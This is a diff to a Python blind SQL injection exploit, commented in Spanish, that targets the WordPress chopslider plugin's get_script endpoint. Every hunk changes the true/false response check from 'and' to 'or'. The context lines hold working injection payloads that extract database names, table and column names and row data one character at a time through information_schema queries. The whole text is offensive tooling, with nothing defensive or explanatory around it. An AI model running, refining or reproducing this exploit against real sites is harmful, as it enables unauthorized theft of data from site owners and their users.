@@ -72,7 +72,7 @@ def obtenerCantidadFilas(tabla):
         blindSql = '/wp-content/plugins/chopslider/get_script/?id=1 AND (SELECT count(*) FROM ' + tabla + ')=' + str(cant) + ' --'
         print('[PAYLOAD] ' + blindSql)
         r = requests.get(sitio + blindSql)
-        if (re.search('preloader : true,', r.text) and re.search('responsive : true,', r.text)):
+        if (re.search('preloader : true,', r.text) or re.search('responsive : true,', r.text)):
             print("[INFO] Cantidad de filas: " + str(cant))
             return cant
             break
@@ -96,7 +96,7 @@ def obtenerBD2():
 
             r = requests.get(sitio + breik)
             # Si es null, es porque termino el nombre de la bd (string). Cambio de columna y busco una nueva bd que descifrar
-            if (re.search('preloader : true,', r.text) and re.search('responsive : true,', r.text)):
+            if (re.search('preloader : true,', r.text) or re.search('responsive : true,', r.text)):
                 baseN = baseN - 1 #si, busca de la ultima a la primera :P
                 bds.append(nombreBD)
                 print("[INFO] Bases de datos encontradas: "+str(bds))
@@ -110,7 +110,7 @@ def obtenerBD2():
             r = requests.get(sitio + blindSql)
             print('[PAYLOAD] '+blindSql)
             # Si obtengo algun True en el sitio, agrego esa letra y avanzo al siguiente caracter
-            if (re.search('preloader : true,', r.text) and re.search('responsive : true,', r.text)):
+            if (re.search('preloader : true,', r.text) or re.search('responsive : true,', r.text)):
                 nombreBD+=c
                 letra+=1
                 print("[INFO] Se encontro un caracter: "+nombreBD)
@@ -128,7 +128,7 @@ def obtenerLongitudTabla(t,database): #obtiene la longitud del nombre de una tab
         blindSql = '/wp-content/plugins/chopslider/get_script/?id=1 AND ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema='+database+' limit '+str(t)+',1),'+str(n)+',1))=00 --'
         print('[PAYLOAD] ' + blindSql)
         r = requests.get(sitio + blindSql)
-        if(re.search('preloader : true,',r.text) and re.search('responsive : true,',r.text)):
+        if(re.search('preloader : true,',r.text) or re.search('responsive : true,',r.text)):
             print("[INFO] Longitud del nombre la tabla:"+str(n-1))
             return n-1
             break
@@ -143,7 +143,7 @@ def obtenerCantidadTablas(database): #obtiene la cantidad de tablas de una BD
         blindSql = '/wp-content/plugins/chopslider/get_script/?id=1 AND (SELECT count(*) FROM information_schema.tables WHERE table_schema='+database+')='+str(cant)+' --'
         print('[PAYLOAD] ' + blindSql)
         r = requests.get(sitio + blindSql)
-        if(re.search('preloader : true,',r.text) and re.search('responsive : true,',r.text)):
+        if(re.search('preloader : true,',r.text) or re.search('responsive : true,',r.text)):
             print("[INFO] Cantidad de tablas:"+str(cant))
             return cant
             break
@@ -165,7 +165,7 @@ def obtenerTablas(database):
                 blindSql = '/wp-content/plugins/chopslider/get_script/?id=1 and ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema='+database+' limit '+ str(tabla)+',1),'+str(i+1)+',1))='+str(ord(c))+' --'
                 r = requests.get(sitio + blindSql)
                 print('[PAYLOAD] ' + blindSql)
-                if (re.search('preloader : true,', r.text) and re.search('responsive : true,', r.text)):
+                if (re.search('preloader : true,', r.text) or re.search('responsive : true,', r.text)):
                     nombreTabla+=c
                     print("[INFO] Se encontro:"+nombreTabla)
                     break
@@ -184,7 +184,7 @@ def obtenerLongitudColumna(c,tabla,database): #longitud del nombre de una column
         blindSql = '/wp-content/plugins/chopslider/get_script/?id=1 AND ascii(substring((SELECT column_name FROM information_schema.columns WHERE table_schema='+database+' and table_name='+tabla+' limit '+str(c)+',1),'+str(n)+',1))=00 --'
         print('[PAYLOAD] '+blindSql)
         r = requests.get(sitio + blindSql)
-        if(re.search('preloader : true,',r.text) and re.search('responsive : true,',r.text)):
+        if(re.search('preloader : true,',r.text) or re.search('responsive : true,',r.text)):
             print("[INFO] Longitud del nombre de la COLUMNA: "+str(n-1))
             return n-1
             break
@@ -199,7 +199,7 @@ def obtenerCantidadColumnas(tabla,database):
         blindSql = '/wp-content/plugins/chopslider/get_script/?id=1 AND (SELECT count(*) FROM information_schema.columns WHERE table_schema='+database+' AND table_name='+tabla+')='+str(cant)+' --'
         print('[PAYLOAD] '+blindSql)
         r = requests.get(sitio + blindSql)
-        if(re.search('preloader : true,',r.text) and re.search('responsive : true,',r.text)):
+        if(re.search('preloader : true,',r.text) or re.search('responsive : true,',r.text)):
             print("[INFO] Cantidad de columnas: "+str(cant))
             return cant
             break
@@ -223,7 +223,7 @@ def obtenerColumnas(tabla,database):
                 blindSql = '/wp-content/plugins/chopslider/get_script/?id=1 and ascii(substring((SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name='+tabla+' limit '+ str(columna)+',1),'+str(i+1)+',1))='+str(ord(c))+' --'
                 r = requests.get(sitio + blindSql)
                 print('[PAYLOAD] '+blindSql)
-                if (re.search('preloader : true,', r.text) and re.search('responsive : true,', r.text)):
+                if (re.search('preloader : true,', r.text) or re.search('responsive : true,', r.text)):
                     nombreColumna+=c
                     print("[INFO] Se encontro: "+nombreColumna)
                     break
@@ -257,12 +257,12 @@ def obtenerDatos(tabla,database):
                     breik = '/wp-content/plugins/chopslider/get_script/?id=1 AND ASCII(SUBSTRING((SELECT ' + str(columna) + ' FROM ' + tabla + ' limit ' + str(fila) + ',1),' + str(i + 1) + ',1))=00 --'
                     r = requests.get(sitio + blindSql)
                     print('[PAYLOAD] '+blindSql)
-                    if (re.search('preloader : true,', r.text) and re.search('responsive : true,', r.text)):
+                    if (re.search('preloader : true,', r.text) or re.search('responsive : true,', r.text)):
                         nombreDato+=c
                         print("[INFO] Se encontro: "+nombreDato)
                         break
                     r = requests.get(sitio + breik)
-                    if (re.search('preloader : true,', r.text) and re.search('responsive : true,', r.text)): #si ya termino el string del dato, rompe el bucle
+                    if (re.search('preloader : true,', r.text) or re.search('responsive : true,', r.text)): #si ya termino el string del dato, rompe el bucle
                         i=(-999)
                         break
 
